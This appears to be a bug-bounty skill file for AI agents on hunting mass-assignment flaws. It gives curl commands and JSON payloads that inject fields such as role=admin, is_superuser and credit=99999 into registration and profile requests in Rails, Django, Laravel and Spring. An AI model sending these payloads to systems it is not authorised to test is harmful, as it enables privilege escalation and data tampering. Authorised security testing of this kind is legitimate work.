---
name: hunt-mass-assignment
description: Hunt Mass Assignment — extra field injection in JSON/XML bodies, ORM parameter binding bypass, admin flag escalation, framework-specific (Rails/Django/Laravel). High when privilege escalation or data tampering. Use when testing API endpoints that accept JSON/XML bodies.
sources: hackerone_public
---

# HUNT-MASS-ASSIGNMENT — Mass Assignment / Auto-Binding

## Crown Jewel Targets

Mass Assignment is High-Critical when it escalates privileges or modifies sensitive data.

- **User registration** — add `role=admin`, `isAdmin=true`, `account_type=premium`
- **Profile update** — add `credit=1000`, `balance=99999`, `tokens=unlimited`
- **API resource creation** — add `owner_id=attacker`, `public=true`, `shared_with=everyone`
- **Password reset** — add `reset_token=attacker_token`
- **OAuth app creation** — add `scope=admin`, `access_level=write`

## Attack Surface Signals

```
API endpoints accepting JSON/XML bodies: POST /api/users, PUT /api/profile
Framework signatures:
  Rails: accepts_nested_attributes_for, attr_accessible/attr_protected
  Django: ModelForm, serializer.is_valid()
  Laravel: $fillable/$guarded, Model::create()
  Spring: @ModelAttribute, @RequestBody with entity binding
  ASP.NET: Model binding with public setters
```

## Step-by-Step Hunting Methodology

### Phase 1 — Discover Parameters

```bash
# Create a legitimate request, capture all fields
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com"}'

# Common extra fields to test
# - role, roles, admin, isAdmin, is_admin
# - permission, permissions, scope, scopes
# - plan, tier, account_type, membership
# - balance, credit, points, tokens
# - verified, isVerified, email_verified, is_active
# - owner, owner_id, user_id
# - api_key, token, secret
```

### Phase 2 — Test Extra Fields

```bash
# Try adding admin role to registration
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"name":"attacker","email":"attacker@test.com","role":"admin"}'

# Try adding credits
curl -X PUT https://target.com/api/profile \
  -H "Content-Type: application/json" \
  -d '{"name":"attacker","credit":99999}'

# Try nested attributes (Rails)
curl -X PUT https://target.com/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{"name":"attacker","role_attributes":{"admin":true}}'
```

### Phase 3 — Framework-Specific Tests

```json
// Rails — nested attributes
{"user":{"name":"hacker","role_attributes":{"admin":true}}}

// Django — try all common user model fields
{"username":"hacker","is_staff":true,"is_superuser":true}

// Laravel — try guarded fields
{"name":"hacker","is_admin":true}

// Spring — try embedded entities
{"name":"hacker","role":{"name":"ROLE_ADMIN"}}
```

## Payload Templates

```json
// User creation
{"name":"hacker","email":"hacker@test.com","role":"admin","isAdmin":true,"verified":true}

// Profile update
{"credit":99999,"tokens":9999,"plan":"enterprise"}

// Nested attributes
{"user":{"name":"hacker","profile_attributes":{"admin":true}}}
```

## Common Root Causes

- ORM auto-binding maps all request body fields to entity properties
- `attr_protected` (Rails) blacklists are incomplete — missed fields are assignable
- `$guarded` (Laravel) set empty means all fields are mass-assignable
- `@ModelAttribute` (Spring) binds all request params to the model
- API documentation doesn't list all available fields, hiding sensitive ones

## Gate 0 Validation

- [ ] Have I found a field that should not be user-settable?
- [ ] Did the server accept the extra field without error?
- [ ] Did the extra field take effect (role changed, credit added)?
